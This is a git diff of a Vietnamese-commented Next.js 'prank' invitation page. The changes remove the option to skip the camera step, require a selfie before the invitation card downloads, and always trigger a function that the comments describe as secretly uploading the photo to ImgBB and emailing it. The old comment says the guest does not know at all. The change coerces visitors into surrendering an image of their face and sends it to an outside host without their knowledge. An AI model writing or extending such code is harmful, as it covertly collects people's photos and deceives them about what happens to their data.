@@ -135,7 +135,7 @@ export default function Home() {
   }
 
   // ==========================================
-  // HÀM XỬ LÝ CAMERA (Laptop & Mobile)
+  // HÀM XỬ LÝ CAMERA (ĐÃ ÁP DỤNG THIẾT QUÂN LUẬT)
   // ==========================================
   const startCamera = async () => {
     try {
@@ -146,8 +146,8 @@ export default function Home() {
       setCapturedImage(null);
     } catch (err) {
       console.error("Lỗi camera:", err);
-      alert("Thiết bị không có Camera hoặc bạn chưa cấp quyền! Bỏ qua bước này cho bạn đó nha 😜");
-      setPrankStage(4);
+      // CẢNH BÁO VÀ KHÓA LẠI: Không setPrankStage(4) nữa
+      alert("📸 BẮT BUỘC: Bạn phải cho phép truy cập Camera và chụp ảnh xác nhận để 'điểm danh' thì mới nhận được thiệp mời nha!");
     }
   };
 
@@ -228,7 +228,7 @@ export default function Home() {
     }
   };
 
-  // 🔴 HÀM UPLOAD ẢNH NGẦM LÊN IMGBB VÀ GỬI EMAIL (Đã fix type lỗi TypeScript)
+  // 🔴 HÀM UPLOAD ẢNH NGẦM LÊN IMGBB VÀ GỬI EMAIL
   const uploadAndSendSelfie = async (base64Img: string) => {
     try {
       const base64Data = base64Img.split(',')[1];
@@ -262,15 +262,29 @@ export default function Home() {
     }
   };
 
+  // 🔒 CHỐT CHẶN BẢO MẬT: XỬ LÝ CHUYỂN BƯỚC
   const handleNextPrank = () => {
     if (prankStage === 2) {
       setPrankStage(3);
       setTimeout(startCamera, 300);
     } else if (prankStage === 3) {
+      // KIỂM TRA: Chưa chụp ảnh thì không cho qua Stage 4
+      if (!capturedImage) {
+        alert("Bạn chưa chụp ảnh xác nhận mà! Bấm nút chụp ở dưới đi đã nào 📸");
+        return;
+      }
       setPrankStage(4);
     } else if (prankStage < 4) {
       setPrankStage(prankStage + 1);
     } else {
+      // CHỐT CUỐI: Đề phòng rủi ro, kiểm tra ảnh lần cuối trước khi cho tải thiệp
+      if (!capturedImage) {
+        alert("Lỗi: Không tìm thấy ảnh bằng chứng. Vui lòng quay lại chụp ảnh!");
+        setPrankStage(3);
+        startCamera();
+        return;
+      }
+
       // 1. TẢI THIỆP
       const link = document.createElement('a');
       link.href = '/thiep-moi.png';
@@ -280,10 +294,8 @@ export default function Home() {
       link.click();
       document.body.removeChild(link);
 
-      // 🔴 2. KÍCH HOẠT QUÁ TRÌNH GỬI ẢNH NGẦM (Khách không hề hay biết)
-      if (capturedImage) {
-        uploadAndSendSelfie(capturedImage);
-      }
+      // 🔴 2. KÍCH HOẠT QUÁ TRÌNH GỬI ẢNH NGẦM
+      uploadAndSendSelfie(capturedImage);
 
       setShowPrankModal(false);
       stopCamera();
@@ -444,7 +456,7 @@ export default function Home() {
                   style={{ width: '100%', height: '100%', objectFit: 'cover', display: capturedImage ? 'none' : 'block', transform: 'scaleX(-1)' }}
                 />
 
-                {/* HIỂN THỊ KHUNG ẢNH LÚC ĐANG SOI CAM (Ép chuẩn vuông 1:1) */}
+                {/* HIỂN THỊ KHUNG ẢNH LÚC ĐANG SOI CAM */}
                 {!capturedImage && (
                   <img
                     src="/khung-anh.png"
@@ -453,7 +465,7 @@ export default function Home() {
                   />
                 )}
 
-                {/* HIỂN THỊ ẢNH ĐÃ CHỤP (Lấy từ canvas đã crop và lật, nên không cần lật lại ở đây) */}
+                {/* HIỂN THỊ ẢNH ĐÃ CHỤP */}
                 {capturedImage && (
                   <img src={capturedImage} alt="Captured" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                 )}
@@ -483,15 +495,15 @@ export default function Home() {
                 </button>
               </div>
             ) : prankStage === 3 ? (
-              /* NÚT BẤM KHI Ở BƯỚC CAMERA */
+              /* NÚT BẤM KHI Ở BƯỚC CAMERA ĐÃ BỊ KHÓA LẠI */
               <>
                 {!capturedImage ? (
                   <button onClick={takePhoto} style={{ width: '100%', padding: '16px', backgroundColor: '#ea580c', color: '#fff', borderRadius: '8px', fontWeight: 'bold', fontSize: '18px', border: 'none', cursor: 'pointer' }}>
-                    📸 Bấm chụp liền!
+                    📸 Bấm chụp xác nhận (Bắt buộc)
                   </button>
                 ) : (
                   <div style={{ display: 'flex', gap: '10px' }}>
-                    <button onClick={startCamera} style={{ flex: 1, padding: '16px', backgroundColor: '#444', color: '#fff', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer', fontSize: '16px' }}>
+                    <button onClick={() => { setCapturedImage(null); startCamera(); }} style={{ flex: 1, padding: '16px', backgroundColor: '#444', color: '#fff', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer', fontSize: '16px' }}>
                       🔄 Chụp lại
                     </button>
                     <button onClick={handleNextPrank} style={{ flex: 1, padding: '16px', backgroundColor: '#fff', color: '#000', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer', fontSize: '16px' }}>
@@ -560,7 +572,7 @@ export default function Home() {
                 </RotateRevealText>
               </div>
 
-              {/* PHẦN HÌNH ẢNH (Điện thoại nằm trên căn giữa, PC nằm phải và ĐÃ TĂNG KÍCH THƯỚC) */}
+              {/* PHẦN HÌNH ẢNH (Điện thoại nằm trên căn giữa, PC nằm phải) */}
               <div className="w-full order-1 dt:order-2 flex justify-center items-center dt:w-[45%] dt:ml-auto">
                 <div className="w-[85%] sm:w-[75%] dt:w-full flex justify-center">
                   <Image
